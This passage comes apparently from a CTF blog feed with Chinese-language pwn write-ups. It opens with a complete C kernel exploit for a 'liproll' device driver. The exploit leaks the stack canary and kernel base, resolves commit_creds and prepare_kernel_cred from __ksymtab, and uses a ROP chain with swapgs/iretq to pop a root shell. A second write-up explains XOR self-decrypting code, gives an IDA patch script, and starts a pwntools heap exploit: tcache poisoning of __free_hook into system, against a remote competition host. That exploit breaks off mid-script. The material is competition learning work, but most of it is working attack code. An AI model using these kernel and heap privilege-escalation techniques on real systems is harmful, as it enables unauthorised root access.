class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_CREATE 0xD3C7F03</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_CHOOSE 0xD3C7F04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_RESET  0xD3C7F02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_CAST   0xD3C7F01</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">liproll</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="built_in">size</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="keyword">uint64_t</span> commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm(</span><br><span class="line">        <span class="string">"mov user_cs, cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">        <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Status saved\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">privilege_escalation</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *(*pkc)(<span class="keyword">void</span> *) = (<span class="keyword">void</span> *)prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> *(*cc)(<span class="keyword">void</span> *) = (<span class="keyword">void</span> *)commit_creds;</span><br><span class="line"></span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Root!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Failed!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swapgs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"swapgs;"</span></span><br><span class="line">        <span class="string">"iretq;"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_rsp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"sub rsp, 0x128;"</span></span><br><span class="line">        <span class="string">"ret;"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/liproll"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak canary</span></span><br><span class="line">    ioctl(fd, CMD_CREATE);</span><br><span class="line">    ioctl(fd, CMD_CHOOSE, &amp;idx);</span><br><span class="line">    <span class="built_in">read</span>(fd, buf, <span class="number">0x180</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> canary = *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] canary is: %p\n"</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// overwrite global_buffer = 0xdeadbeef</span></span><br><span class="line">    <span class="comment">// overwrite global_buffer size = 0x0</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>) = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(buf + <span class="number">0x108</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">liproll</span> <span class="title">tmp</span> = </span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        .ptr = buf,</span><br><span class="line">        .<span class="built_in">size</span> = <span class="number">0x110</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, CMD_CAST, &amp;tmp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak .data and .bss section</span></span><br><span class="line">    <span class="built_in">read</span>(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> _data_sec = ((*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x18</span>) &gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">12</span>) + <span class="number">0x2000</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> _bss_sec = _data_sec + <span class="number">0x4C0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] .data section address is: %p\n"</span>, _data_sec);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] .bss section address is: %p\n"</span>, _bss_sec);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak vmlinux_base</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>) = _bss_sec + <span class="number">0x80</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(buf + <span class="number">0x108</span>) = <span class="number">8</span>;</span><br><span class="line">    tmp.ptr = buf;</span><br><span class="line">    tmp.<span class="built_in">size</span> = <span class="number">0x110</span>;</span><br><span class="line">    ioctl(fd, CMD_CHOOSE, &amp;idx);</span><br><span class="line">    ioctl(fd, CMD_CAST, &amp;tmp);</span><br><span class="line">    <span class="built_in">read</span>(fd, buf, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> vmlinux_base = *(<span class="keyword">uint64_t</span> *)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] vmlinux base is: %p\n"</span>, vmlinux_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// overwrite vmlinux_base = 0 to bypass liproll_read check</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)buf = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">write</span>(fd, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find commit_creds and prepare_kernel_cred in __ksymtab</span></span><br><span class="line">    <span class="keyword">uint64_t</span> __ksymtab_start = vmlinux_base + <span class="number">0x12EE908</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] __ksymtab_start address is: %p\n"</span>, __ksymtab_start);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">int</span> found_commit_creds = <span class="number">0</span>, found_prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> found_do_sync_core = <span class="number">0</span>, found_intel_pmu_save_and_restart = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x12000</span>; i += <span class="number">0xFC</span>)&#123;</span><br><span class="line">        <span class="keyword">char</span> accept_buf[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">uint64_t</span> base_addr = __ksymtab_start + i;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>) = base_addr;</span><br><span class="line">        *(<span class="keyword">uint32_t</span> *)(buf + <span class="number">0x108</span>) = <span class="number">0xFC</span>;</span><br><span class="line">        ioctl(fd, CMD_CHOOSE, &amp;idx);</span><br><span class="line">        ioctl(fd, CMD_CAST, &amp;tmp);</span><br><span class="line">        <span class="built_in">read</span>(fd, accept_buf, <span class="number">0xFC</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">0xFC</span>; j += <span class="number">0xC</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> name_buf[<span class="number">0x100</span>];</span><br><span class="line">            <span class="keyword">uint32_t</span> func_offset = *(<span class="keyword">uint32_t</span> *)(accept_buf + j);</span><br><span class="line">            <span class="keyword">uint32_t</span> name_offset = *(<span class="keyword">uint32_t</span> *)(accept_buf + j + <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">uint64_t</span> func_addr = ((<span class="keyword">uint32_t</span>)base_addr + func_offset + j) | (<span class="number">0xffffffff</span>ull &lt;&lt; <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">uint64_t</span> name_addr = base_addr + name_offset + j + <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">            *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>) = name_addr;</span><br><span class="line">            *(<span class="keyword">uint32_t</span> *)(buf + <span class="number">0x108</span>) = <span class="number">0x20</span>;</span><br><span class="line">            ioctl(fd, CMD_CHOOSE, &amp;idx);</span><br><span class="line">            ioctl(fd, CMD_CAST, &amp;tmp);</span><br><span class="line">            <span class="built_in">read</span>(fd, name_buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">memcmp</span>(name_buf, <span class="string">"commit_creds"</span>, <span class="number">0xC</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[+] found commit_creds address is: %p\n"</span>, func_addr);</span><br><span class="line">                found_commit_creds = <span class="number">1</span>;</span><br><span class="line">                commit_creds = func_addr;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">memcmp</span>(name_buf, <span class="string">"prepare_kernel_cred"</span>, <span class="number">0x13</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[+] found prepare_kernel_cred address is: %p\n"</span>, func_addr);</span><br><span class="line">                found_prepare_kernel_cred = <span class="number">1</span>;</span><br><span class="line">                prepare_kernel_cred = func_addr;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(found_prepare_kernel_cred &amp;&amp; found_commit_creds)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rop</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x110</span>) = canary;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x120</span>) = &amp;sub_rsp + <span class="number">8</span>; </span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x0</span>) = &amp;privilege_escalation; </span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x8</span>) = &amp;swapgs + <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x10</span>) = &amp;getshell;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x18</span>) = user_cs;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x20</span>) = user_rflags;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x28</span>) = user_sp;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x30</span>) = user_ss;</span><br><span class="line">    </span><br><span class="line">    tmp.<span class="built_in">size</span> = <span class="number">0x128</span>;</span><br><span class="line">    ioctl(fd, CMD_CHOOSE, &amp;idx);</span><br><span class="line">    ioctl(fd, CMD_CAST, &amp;tmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>简单提一下自己踩的坑：</p><ul><li>打印栈上残留的数据的时候，发现实际运行和调试的时候，得到的数据是不一样的，这里卡了很久；后面直接就不挂调试，而是直接dump栈上的数据，然后找有用的地址。</li><li>最后写rop的时候，内核栈放不下最后会crash，所以做一个小小的栈迁移；不过既然任何gadgets都可以在用户程序中构造，也很方便。</li><li>因为gadget是封装在用户态程序的函数体中的，所以需要跳过函数头才能直接执行到gadget本身，否则会有<code>push rbp</code>的执行。</li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文首发于安全客：&lt;a href=&quot;https://www.anquanke.com/post/id/234263&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/234263&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;分享一下比赛中除了Deterministic Heap之外的&lt;del&gt;六&lt;/del&gt;五道题。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.github.io/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>钓鱼城杯初赛部分pwn</title>
    <link href="https://n0nop.github.io/2020/08/29/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86pwn/"/>
    <id>https://n0nop.github.io/2020/08/29/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86pwn/</id>
    <published>2020-08-28T16:06:08.000Z</published>
    <updated>2020-08-28T16:15:28.902Z</updated>
    
    <content type="html"><![CDATA[<p>实习的倒数第二天在公司打的最后一场比赛了，贡献一点小小的力量，最后进前十了还是很开心的。但是只搞了两个pwn，剩下的babyrpc没有仔细看，vmpwn卡住了，就暂且写一下剩下部分的wp吧，其他的看看后面能不能搜到wp。</p><a id="more"></a><h2 id="unknown"><a href="#unknown" class="headerlink" title="unknown"></a>unknown</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li><p><code>__libc_start_main</code>首先会执行<code>fini</code>函数，其中调用了<code>sub_1006</code>这个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_1006</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  mprotect((<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> __int64)&amp;loc_E57 &amp; <span class="number">0xFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    *((_BYTE *)&amp;loc_E57 + i) ^= <span class="number">0x33</span>u;</span><br><span class="line">  mprotect((<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> __int64)&amp;loc_E57 &amp; <span class="number">0xFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">5</span>);</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">void</span> *, __int64, __int64))loc_E57)(&amp;loc_FAF, <span class="number">16L</span>L, <span class="number">51L</span>L);</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="keyword">void</span>))loc_FAF)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即对<code>0xE57</code>开始的15 bytes进行异或0x33的自解密，然后调用<code>mprotect</code>赋予执行权限。</p></li><li><p>写个脚本patch一下之后，得到另一个同样功能的函数，后面基本上是嵌套了，最后才是解密<code>main</code>函数和主逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_FAF</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_E57((__int64)&amp;loc_EF9, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  sub_E57((__int64)main, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))loc_EF9)();</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))loc_EF9)();</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="keyword">void</span>))loc_EF9)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_EF9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_E57((__int64)&amp;loc_A94, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  sub_E57((__int64)&amp;loc_CD9, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  sub_E57((__int64)&amp;loc_C01, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  sub_E57((__int64)&amp;loc_B5D, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  sub_E57((__int64)&amp;loc_D61, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  sub_E57((__int64)&amp;loc_A4B, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_E57((__int64)word_9EA, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再最后写个脚本patch一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">starts = [<span class="number">0xA94</span>, <span class="number">0xCD9</span>, <span class="number">0xC01</span>, <span class="number">0xB5D</span>, <span class="number">0xD61</span>, <span class="number">0xA4B</span>, <span class="number">0x9EA</span>, <span class="number">0xDB5</span>]</span><br><span class="line"><span class="keyword">for</span> start <span class="keyword">in</span> starts:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10</span>):</span><br><span class="line">        bytes = idc.Byte(start + i)</span><br><span class="line">        idc.PatchByte(start + i, bytes ^ <span class="number">0x33</span>)</span><br></pre></td></tr></table></figure></li><li><p>最后得到修复完成的<code>main</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init_buf(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( choice() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1L</span>L:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2L</span>L:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3L</span>L:</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4L</span>L:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5L</span>L:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Unknown"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>利用点在于<code>add</code>功能下标存在上溢，可以修改最后一个chunk的size，从而再edit的时候创造一个heap overflow；然后就是直接用unsorted bin去leak出libc，然后tcache poisoning打<code>__free_hook</code>为<code>system</code>。</p></li><li><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os, re</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">'122.112.212.41'</span>, <span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xF8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i + <span class="number">1</span>, <span class="number">0xF8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i + <span class="number">1</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xF8</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"LIBCADDR\n"</span>)</span><br><span class="line">show(<span 